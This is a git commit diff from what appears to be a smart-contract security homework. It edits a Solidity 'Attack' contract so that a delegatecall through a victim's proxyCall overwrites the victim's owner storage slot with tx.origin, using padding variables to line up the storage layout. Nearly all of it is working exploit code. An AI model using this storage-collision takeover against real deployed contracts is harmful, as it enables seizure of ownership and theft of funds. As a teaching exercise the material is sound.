f081b9c16faa7e5a11492db262a0a34d0bce9048
Michael <yanghao13111@gmail.com>
2024-03-25 22:17:22 +0800

    final update

--- hw1/src/Delegation/Delegation.sol
+++ hw1/src/Delegation/Delegation.sol
@@ -3,26 +3,29 @@ pragma solidity ^0.8.0;
 
 interface ID31eg4t3 {
     function proxyCall(bytes calldata data) external returns (address);
+    function changeResult() external;
 }
 
 contract Attack {
     address internal immutable victim;
+    uint256 v1 = 23421223356;
+    uint256 v2 = 3654513134567;
+    uint256 v3 = 45665465178;
+    uint256 v4 = 45652156156478;
     address public owner;
     mapping(address => bool) public result;
-
+        
     constructor(address addr) payable {
         victim = addr;
-        owner = msg.sender; // 直接設置部署者為owner
     }
 
-    function changeOwner(address newOwner) public {
-        require(msg.sender == owner, "Only the owner can change the owner.");
-        owner = newOwner;
+    function changeOwner() public {
+        owner = tx.origin;
         result[owner] = true;
     }
 
     function exploit() external {
-        bytes memory data = abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, abi.encodeWithSelector(this.changeOwner.selector, tx.origin));
+        bytes memory data = abi.encodeWithSignature("changeOwner()");
         ID31eg4t3(victim).proxyCall(data);
     }
 }
